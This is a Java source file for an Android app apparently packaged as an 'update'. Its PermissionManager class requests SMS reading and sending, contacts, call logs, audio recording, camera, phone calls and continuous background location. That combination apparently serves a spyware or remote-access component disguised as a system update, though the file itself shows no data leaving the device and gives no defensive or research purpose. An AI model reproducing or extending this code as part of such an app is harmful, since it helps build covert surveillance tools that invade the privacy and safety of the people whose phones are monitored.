package com.kasari.update;

import android.Manifest;
import android.app.Activity;
import android.content.pm.PackageManager;
import android.os.Build;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import java.util.ArrayList;
import java.util.List;

public class PermissionManager {

    static final int REQ_CODE = 2001;

    public static void requestAll(Activity activity) {
        List<String> needed = new ArrayList<>();

        // ── Core permissions (all API levels) ────────────────────────────────
        String[] core = {
            Manifest.permission.READ_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.SEND_SMS,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.CAMERA,
            Manifest.permission.CALL_PHONE,
        };
        for (String p : core) addIfNeeded(activity, needed, p);

        // ── PROCESS_OUTGOING_CALLS: deprecated API 29+ (still declared, skip request) ──
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) {
            addIfNeeded(activity, needed, Manifest.permission.PROCESS_OUTGOING_CALLS);
        }

        // ── Storage: WRITE only up to API 28 (scoped storage after) ──────────
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) {
            addIfNeeded(activity, needed, Manifest.permission.WRITE_EXTERNAL_STORAGE);
        }
        // ── Storage: READ only up to API 32 (READ_MEDIA_* replaces in API 33+) ─
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.TIRAMISU) {
            addIfNeeded(activity, needed, Manifest.permission.READ_EXTERNAL_STORAGE);
        }

        // ── Android 13+ (API 33): granular media + notification permissions ──
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            addIfNeeded(activity, needed, Manifest.permission.READ_MEDIA_IMAGES);
            addIfNeeded(activity, needed, Manifest.permission.READ_MEDIA_VIDEO);
            addIfNeeded(activity, needed, Manifest.permission.READ_MEDIA_AUDIO);
            addIfNeeded(activity, needed, Manifest.permission.POST_NOTIFICATIONS);
        }

        if (!needed.isEmpty()) {
            ActivityCompat.requestPermissions(activity,
                needed.toArray(new String[0]), REQ_CODE);
        } else {
            activity.onRequestPermissionsResult(REQ_CODE, new String[0], new int[0]);
        }
    }

    // ── Request background location separately (Android 10+) ─────────────────
    // Must be called AFTER foreground location is already granted.
    public static void requestBackgroundLocation(Activity activity) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            addIfNeededAndRequest(activity, Manifest.permission.ACCESS_BACKGROUND_LOCATION);
        }
    }

    private static void addIfNeeded(Activity a, List<String> list, String perm) {
        if (ContextCompat.checkSelfPermission(a, perm) != PackageManager.PERMISSION_GRANTED)
            list.add(perm);
    }

    private static void addIfNeededAndRequest(Activity a, String perm) {
        if (ContextCompat.checkSelfPermission(a, perm) != PackageManager.PERMISSION_GRANTED)
            ActivityCompat.requestPermissions(a, new String[]{perm}, REQ_CODE + 1);
    }

    public static boolean has(android.content.Context ctx, String perm) {
        return ContextCompat.checkSelfPermission(ctx, perm)
               == PackageManager.PERMISSION_GRANTED;
    }
}